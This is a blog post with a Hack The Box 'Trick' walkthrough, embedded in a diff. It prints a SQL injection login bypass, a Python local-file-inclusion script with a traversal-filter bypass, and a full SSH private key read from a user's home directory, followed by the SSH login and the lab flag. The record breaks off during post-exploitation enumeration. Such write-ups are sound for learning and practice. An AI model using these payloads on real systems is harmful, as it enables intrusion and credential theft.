@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content=""
+  />
+  
+    
+      <title>Trick - HTB Writeup | Supaaasuge&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="https://supaaasuge.github.io/">
+      <img
+        class="icon"
+        src="/images/brandIcon.svg"
+      />
+    </a>
+    <div class="text">
+      <a href="https://supaaasuge.github.io/"><h1>Supaaasuge&#39;s Blog</h1></a>
+      <h3>Aspiring IT/Cybersecurity Professional</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/index.xml"><b>RSS</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">Trick - HTB Writeup</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2024-05-06</time>
+    <span>in</span>
+    
+      <a href="/categories/hack-the-box">Hack The Box</a>
+  </strong>
+  <span> • 1811 words</span>
+  <span> • 9 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/sqli">SQLi</a>
+    </div>
+  
+</div>
+
+      <div class="content"><h1 id="trick---htb-writeup">Trick - HTB Writeup</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting off, I ran an <code>nmap</code> scan on all open ports at a rate of <code>10000</code>. Moving on from there, I ran a service version scan, TCP scan, and operating system detection scan on the ports that I discoverd.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open --min-rate <span style="color:#ae81ff">10000</span> $IP
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94SVN scan initiated Mon May  6 14:32:07 2024 as: nmap -p- --open --min-rate 10000 -oN init.scan 10.129.227.180</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.180
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.40s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">47512</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">18019</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>25/tcp open  smtp
+</span></span><span style="display:flex;"><span>53/tcp open  domain
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Mon May  6 14:32:56 2024 -- 1 IP address (1 host up) scanned in 48.89 seconds</span>
+</span></span></code></pre></div><p>Moving on&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -p22,25,53,80 -sCVT -A -O $IP
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94SVN scan initiated Mon May  6 14:42:11 2024 as: nmap -p22,25,80,54 -sCV -A -Pn -oN scva.scan 10.129.227.180</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.180
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.41s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE  SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>25/tcp open   smtp?
+</span></span><span style="display:flex;"><span>|_smtp-commands: Couldn<span style="color:#960050;background-color:#1e0010">&#39;</span>t establish connection on port <span style="color:#ae81ff">25</span>
+</span></span><span style="display:flex;"><span>54/tcp closed xns-ch
+</span></span><span style="display:flex;"><span>80/tcp open   http    nginx 1.14.2
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.14.2
+</span></span><span style="display:flex;"><span>|_http-title: Coming Soon - Start Bootstrap Theme
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Linux 5.0 <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Linux 4.15 - 5.8 <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Linux 5.3 - 5.4 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 5.0 - 5.5 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.2 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span>Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 54/tcp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT       ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   401.27 ms 10.10.14.1
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   401.48 ms 10.129.227.180
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Mon May  6 14:46:51 2024 -- 1 IP address (1 host up) scanned in 280.00 seconds</span>
+</span></span></code></pre></div><p>From here, I decided to try some DNS enumeration of the records using <code>dig</code>. Usually hack the box domains are just the room name with <code>.htb</code> appended so naturally my first thought was to check the dns records of <code>trick.htb</code> to see if anything would come back:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig axfr @$IP trick.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; axfr @10.129.227.180 trick.htb
+</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">604800</span> <span style="color:#ae81ff">86400</span> <span style="color:#ae81ff">2419200</span> <span style="color:#ae81ff">604800</span>
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	NS	trick.htb.
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	A	127.0.0.1
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	AAAA	::1
+</span></span><span style="display:flex;"><span>preprod-payroll.trick.htb. <span style="color:#ae81ff">604800</span> IN	CNAME	trick.htb.
+</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">604800</span> <span style="color:#ae81ff">86400</span> <span style="color:#ae81ff">2419200</span> <span style="color:#ae81ff">604800</span>
+</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">331</span> msec
+</span></span><span style="display:flex;"><span>;; SERVER: 10.129.227.180#53<span style="color:#f92672">(</span>10.129.227.180<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; WHEN: Mon May <span style="color:#ae81ff">06</span> 15:04:34 EDT <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>;; XFR size: <span style="color:#ae81ff">6</span> records <span style="color:#f92672">(</span>messages 1, bytes 231<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>from the results, we can see there is <code>preprod-payroll.trick.htb</code> and <code>root.trick.htb</code> along with <code>trick.htb</code>. Let&rsquo;s go ahead and add these to <code>/etc/hosts</code> so that our browser know&rsquo;s what IP address to point to for this domain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo $IP <span style="color:#e6db74">&#39;trick.htb preprod-payroll.htb trick.htb&#39;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><p>If i didn&rsquo;t want to guess the domain, you could also run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig +noall +answer @$IP -x $IP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span> ... trick.htb
+</span></span></code></pre></div><p>Before I move onto the website and further enumeration of subdomains, I decided to enumerate the <code>smtp</code> service on port <code>25</code> using the <code>smtp-user-enum</code> script and the <code>/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"></code></pre></div><p>we can see from the output that the default character size of the response is 5,480 characters so we then use <code>--hh 5480</code> to properly filter these results.</p>
+<p>No new subdomains were found, unlucky. Next, I will move on to directory brute-forcing with <code>feroxbuster</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -u http://trick.htb/ --smart
+</span></span></code></pre></div><h3 id="sql-injection">SQL Injection</h3>
+<p>After opening firefox and heading over to <code>http://preprod-payroll.trick.htb</code> we can see that it is a login page. I then started testing out different XSS/SQLi payloads. The payload that allowed us to bypass authentication is: <code>' OR 1=1- --</code>. After putting this is both the username and password field, we can see that we successfully by pass the authentication in the login page. Because we have SQLi here, I am going go ahead and capture this request using burp suite, save it to a file, then run <code>sqlmap</code> on it to see if I can&rsquo;t dump the full database and it&rsquo;s tables. The first few times I ran sqlmap, I did not get much back. However each run, I increaded <code>--level</code> and <code>--risk</code> +1. With sqlmap running in the background, I decided to check out the Recruitment Management System dashboard now that we had access as an administrator. After checking the <code>Users</code> page from the sidebar, there is a listing to perform an &ldquo;Action&rdquo; on the user <code>Enemigosss</code>. When you click edit, you can see the password is blocked out as follows:
+<img src="/posts/image.png" alt="enemigosss"></p>
+<p>To find the actual value of the password, we can simply inspect the source code for the page by pressing <code>CTRL+U</code> or right clicking and then scrolling down and clicking <code>Inspect(Q)</code>. After doing this, we can see the password in plaintext:</p>
+<p><img src="/posts/image-1.png" alt="alt text"></p>
+<p>At this point, I tried using this password for SSH authentication but did not have success. At this point, I decided to just keep fuzzing using a bunch of different wordlists. Because we already have quite a few different subdomains, I figured it&rsquo;s likely there are other similar domains etc. To do this, I used the tool <code>wfuzz</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hc 400,403,404 -H <span style="color:#e6db74">&#34;Host: preprod-FUZZ.trick.htb&#34;</span> -u http://trick.htb/ -t <span style="color:#ae81ff">40</span> --hw <span style="color:#ae81ff">475</span>
+</span></span></code></pre></div><p>From this, after only a little bit of waiting we find another endpoint:</p>
+<pre tabindex="0"><code>********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://trick.htb/
+Total requests: 100000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload   
+=====================================================================
+
+000000668:   200        178 L    631 W      9660 Ch     &#34;marketing
+                                                        &#34;         
+000005905:   302        266 L    527 W      9546 Ch     &#34;payroll&#34;
+</code></pre><p>Then, adding this to our <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo $IP <span style="color:#e6db74">&#39;preprod-marketing.trick.htb&#39;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><p>Now I will check this site out using firefox&hellip; Something I notice pretty quickly after I began clicking around a bit was the URL scheme, and how it was rendering pages:
+Ex:
+<code>http://preprod-marketing.trick.htb/index.php?page=services.html</code></p>
+<h3 id="shell-as-michael">Shell as michael</h3>
+<p>Given the fact it is specifying a particular page in the page parameter, I decided to try various LFI payloads to see it I could get any success. After trying <code>/etc/passwd</code> and a bunch of bypassd techniques, I had no success. However, I should note that replacing <code>index.php</code> in the page parameter caused the same page to be rendered as <code>index.php</code>. So this means that it&rsquo;s being filtered using a <code>PHP</code> filter. So, I decided to try and use some PHP filter&rsquo;s to render the different pages as shown <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-phpfilter">here</a>. Along with some other bypasses. After I found a working payload (<code>....//</code>, due to str_replace of <code>../</code>)&hellip; Here is the script I wrote to more easily get file inclusion:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>passwd <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> passwd:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Usage: python lfi.py &lt;file path&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> passwd<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;/&#39;</span>):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> passwd<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> passwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">.</span>format(payload))
+</span></span><span style="display:flex;"><span>print(resp<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p>Also, I should mention that before I did this I did check the <code>about.html</code> page from <code>preprod-marketing.trick.htb</code> and wrote down a list of all the names I found, including:</p>
+<pre tabindex="0"><code>levi
+mari
+jen
+jen terry
+levi moore
+erik
+erik morris
+michael
+michael owen
+</code></pre><p>I then used this list and tried to check out any home directories with any readable private SSH keys:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python lfi.py home/michael/.ssh/id_rsa
+</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
+</span></span><span style="display:flex;"><span>c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
+</span></span><span style="display:flex;"><span>YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
+</span></span><span style="display:flex;"><span>4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
+</span></span><span style="display:flex;"><span>Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
+</span></span><span style="display:flex;"><span>1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
+</span></span><span style="display:flex;"><span>DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+</span></span><span style="display:flex;"><span>+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
+</span></span><span style="display:flex;"><span>hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
+</span></span><span style="display:flex;"><span>jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
+</span></span><span style="display:flex;"><span>IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
+</span></span><span style="display:flex;"><span>aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
+</span></span><span style="display:flex;"><span>KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
+</span></span><span style="display:flex;"><span>tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
+</span></span><span style="display:flex;"><span>U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
+</span></span><span style="display:flex;"><span>fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
+</span></span><span style="display:flex;"><span>PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
+</span></span><span style="display:flex;"><span>3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
+</span></span><span style="display:flex;"><span>fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
+</span></span><span style="display:flex;"><span>AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
+</span></span><span style="display:flex;"><span>In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
+</span></span><span style="display:flex;"><span>JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
+</span></span><span style="display:flex;"><span>jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
+</span></span><span style="display:flex;"><span>IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>Nice! I then re-ran the above command but appended <code>&gt; id_rsa</code> to the command to output the key to a file. Then after changing the permissions to the correct permissions, I was able to get a shell via SSH and the user <code>michael</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> id_rsa
+</span></span><span style="display:flex;"><span>ssh michael@10.129.227.180 -i id_rsa
+</span></span><span style="display:flex;"><span>Linux trick 4.19.0-20-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Fri May <span style="color:#ae81ff">10</span> 22:35:10 <span style="color:#ae81ff">2024</span> from 10.10.14.55
+</span></span><span style="display:flex;"><span>michael@trick:~$ ls
+</span></span><span style="display:flex;"><span>Desktop    Downloads  Pictures  Templates  Videos
+</span></span><span style="display:flex;"><span>Documents  Music      Public    user.txt
+</span></span><span style="display:flex;"><span>michael@trick:~$ cat user.txt
+</span></span><span style="display:flex;"><span>7c78cd882b52c9c9343a18c6a4770fcd
+</span></span></code></pre></div><h4 id="post-exploitationprivilege-escalation">Post-exploitation/Privilege escalation</h4>
+<h5 id="environement-variables">Environement variables</h5>
+<pre tabindex="0"><code>SHELL=/bin/bash
+LANGUAGE=en_US:en
+PWD=/home/michael
+LOGNAME=michael
+XDG_SESSION_TYPE=tty
+HOME=/home/michael
+LANG=en_US.UTF-8
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
+SSH_CONNECTION=10.10.14.55 56330 10.129.227.180 22
+XDG_SESSION_CLASS=user
+TERM=xterm-256color
+USER=michael
+SHLVL=1
+XDG_SESSION_ID=964
+XDG_RUNTIME_DIR=/run/user/1001
+SSH_CLIENT=10.10.14.55 56330 22
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus
+MAIL=/var/mail/michael
+SSH_TTY=/dev/pts/1
+_=/usr/bin/env
+</code></pre><h5 id="os-information">OS Information</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/*-release
+</span></span><span style="display:flex;"><span>PRETTY_NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Debian GNU/Linux 10 (buster)&#34;</span>
+</span></span><span style="display:flex;"><span>NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Debian GNU/Linux&#34;</span>
+</span></span><span style="display:flex;"><span>VERSION_ID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10&#34;</span>
+</span></span><span style="display:flex;"><span>VERSION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10 (buster)&#34;</span>
+</span></span><span style="display:flex;"><span>VERSION_CODENAME<span style="color:#f92672">=</span>buster
+</span></span><span style="display:flex;"><span>ID<span style="color:#f92672">=</span>debian
+</span></span><span style="display:flex;"><span>HOME_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.debian.org/&#34;</span>
+</span></span><span style="display:flex;"><span>SUPPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.debian.org/support&#34;</span>
